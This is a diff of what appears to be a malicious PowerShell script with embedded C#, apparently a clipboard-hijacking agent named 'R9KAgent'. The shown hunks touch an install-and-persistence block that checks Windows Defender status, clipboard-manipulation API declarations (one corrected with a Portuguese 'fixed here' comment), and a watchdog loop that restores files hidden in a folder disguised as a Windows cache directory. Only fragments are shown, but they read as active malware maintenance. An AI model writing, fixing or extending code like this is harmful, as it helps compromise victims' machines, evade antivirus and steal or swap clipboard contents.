@@ -27,7 +27,6 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # Instalação e Persistência
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -156,7 +155,7 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll", SetLastError = true)] public static extern bool OpenClipboard(IntPtr hWnd);
         [DllImport("user32.dll", SetLastError = true)] public static extern bool CloseClipboard();
         [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr GetClipboardData(uint uFormat);
-        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetClipboardData(uint uFormat, IntPtr hMem);
+        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem); // CORRIGIDO AQUI
         [DllImport("user32.dll", SetLastError = true)] public static extern bool EmptyClipboard();
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem);
@@ -312,7 +311,6 @@ if (-not ("R9KAgent" -as [type])) {
         }
 
         static void WatchdogLoop() {
-            // Mantido o mesmo comportamento de restauração
             string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
             while (true) {
                 try {
